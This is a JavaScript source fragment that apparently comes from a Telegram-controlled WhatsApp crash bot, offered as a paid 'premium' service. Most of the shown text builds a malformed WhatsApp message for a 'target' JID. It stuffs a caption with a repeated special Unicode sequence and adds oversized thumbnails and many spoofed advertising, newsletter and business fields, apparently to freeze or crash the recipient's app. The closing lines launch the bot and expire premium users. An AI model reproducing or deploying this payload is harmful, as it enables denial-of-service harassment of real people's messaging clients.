                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/socksta",
                mediaUrl: "https://t.me/socksta",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/socksta",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbsockCampaignId: "smb_sock_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

bot.launch();
console.log("Telegram bot is running...");
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    Object.keys(botSessions).forEach(botToken => {
        if (botSessions[botToken].expiresAt < now) {
            delete botSessions[botToken];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000); // Check every hour
